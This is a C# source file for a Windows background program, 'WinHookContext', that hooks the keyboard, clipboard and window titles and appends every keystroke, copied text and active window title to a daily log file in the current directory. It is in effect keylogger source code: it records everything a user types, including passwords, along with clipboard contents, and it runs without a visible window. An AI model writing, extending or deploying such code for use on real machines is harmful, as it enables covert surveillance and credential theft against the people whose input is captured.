using System;
using System.IO;
using System.Media;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WinHook
{
    public class WinHookContext : ApplicationContext
    {
        private readonly ClipboardHook clipHook = new ClipboardHook();
        private readonly DuplicateLaunch dlaunch = DuplicateLaunch.Default;
        private readonly NamedEvent exitEvent = NamedEvent.Deafult;
        private readonly KeyboardHook kbdHook = new KeyboardHook();
        private readonly StreamWriter streamWriter;
        private readonly WindowsHook wndHook = new WindowsHook();

        public WinHookContext()
        {
            var thread = new Thread(ExitAppEventHandler);
            streamWriter = new StreamWriter(GetArchiveFileName(), true);
            wndHook.WindowTextChanged += WndHookOnWindowTextChanged;
            kbdHook.KeyUp += KbdHookOnKeyUp;
            clipHook.ClipBoardChanged += ClipHookOnClipBoardChanged;
            thread.Start();
            SystemSounds.Exclamation.Play();
        }

        private static string GetArchiveFileName()
        {
            var buffer = new StringBuilder(255);
            Kernel32.GetModuleFileName(IntPtr.Zero, buffer, 255);
            buffer.ToString();
            return Path.Combine(Environment.CurrentDirectory,
                Path.ChangeExtension(DateTime.Today.ToString("yyyy_MM_dd"), ".log"));
        }

        private void ExitAppEventHandler()
        {
            exitEvent.Wait();
            exitEvent.Reset();
            SystemSounds.Asterisk.Play();
            Application.Exit();
        }

        private void KbdHookOnKeyUp(object sender, LowLevelKeyboardEventArgs eventargs)
        {
            if (sender is KeyboardHook && eventargs.Text.Length > 0)
                lock (streamWriter)
                {
                    streamWriter.Write(eventargs.Text);
                    streamWriter.Flush();
                }
        }

        private void ClipHookOnClipBoardChanged(ClipboardChangedEventArgs eventargs)
        {
            if (eventargs.Text.Length > 0)
                lock (streamWriter)
                {
                    streamWriter.WriteLine();
                    streamWriter.WriteLine($"{eventargs.TimeStamp} CLIPBOARD");
                    streamWriter.WriteLine(eventargs.Text);
                    streamWriter.Flush();
                }
        }

        private void WndHookOnWindowTextChanged(object sender, WindowTextChangeArgs eventargs)
        {
            if (sender is WindowsHook && eventargs.Text.Length > 0)
                lock (streamWriter)
                {
                    streamWriter.WriteLine();
                    streamWriter.WriteLine($"{eventargs.TimeStamp} {eventargs.Text}");
                    streamWriter.Flush();
                }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                wndHook.Dispose();
                kbdHook.Dispose();
                clipHook.Dispose();
                streamWriter.Dispose();
                exitEvent.Reset();
                dlaunch.Dispose();
            }

            base.Dispose(disposing);
        }
    }
}